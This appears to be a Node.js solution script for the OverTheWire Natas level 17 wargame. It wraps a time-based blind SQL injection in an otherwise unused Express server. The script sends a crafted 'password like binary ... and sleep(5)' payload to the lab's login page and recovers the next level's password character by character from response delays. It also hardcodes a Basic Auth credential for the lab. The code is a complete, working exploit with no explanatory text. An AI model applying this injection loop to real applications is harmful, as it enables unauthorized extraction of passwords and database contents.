const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
}
async function req(ch) {
    let aTime = new Date();
    const res = await axios.post(`http://natas17.natas.labs.overthewire.org/index.php`, `username=natas18%22+and+password+like+binary+%22${ch}%25%22+and+sleep%285%29+--+`, {headers});
    let bTime = new Date();
    let diff = (bTime.getTime() - aTime.getTime()) / 1000;
    if(diff >= 5) {
        return true;
    } else {
        return false;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));